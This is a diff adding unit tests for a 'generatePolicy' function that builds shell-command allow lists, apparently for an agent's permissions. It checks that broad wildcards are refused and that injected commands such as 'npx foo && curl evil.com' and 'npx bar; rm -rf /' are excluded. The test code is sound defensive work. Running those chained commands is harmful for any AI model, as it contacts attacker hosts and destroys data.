@@ -97,6 +97,24 @@ describe("generatePolicy", () => {
             expect(policy.allow).toContain("git *");
             expect(policy.deny.length).toBeGreaterThan(0);
         });
+
+        it("should not include overly broad wildcard defaults", () => {
+            // Arrange
+            const scanResult: ProjectScanResult = {
+                scripts: [],
+                workflowCommands: [],
+                miseTasks: [],
+                languages: [],
+            };
+
+            // Act
+            const policy = generatePolicy(scanResult);
+
+            // Assert — commands like find/grep/echo are too broad with wildcards
+            expect(policy.allow).not.toContain("find *");
+            expect(policy.allow).not.toContain("grep *");
+            expect(policy.allow).not.toContain("echo *");
+        });
     });
 
     describe("given a scan result with all sources", () => {
@@ -163,6 +181,28 @@ describe("generatePolicy", () => {
             );
             expect(policy.allow).not.toContain("npm run lint; npm test");
             expect(policy.allow).not.toContain("echo $(whoami)");
+        });
+
+        it("should exclude npx commands containing shell metacharacters", () => {
+            // Arrange
+            const scanResult: ProjectScanResult = {
+                scripts: [],
+                workflowCommands: [
+                    "npx vitest run",
+                    "npx foo && curl evil.com",
+                    "npx bar; rm -rf /",
+                ],
+                miseTasks: [],
+                languages: ["node"],
+            };
+
+            // Act
+            const policy = generatePolicy(scanResult);
+
+            // Assert
+            expect(policy.allow).toContain("npx vitest run");
+            expect(policy.allow).not.toContain("npx foo && curl evil.com");
+            expect(policy.allow).not.toContain("npx bar; rm -rf /");
         });
     });
 });
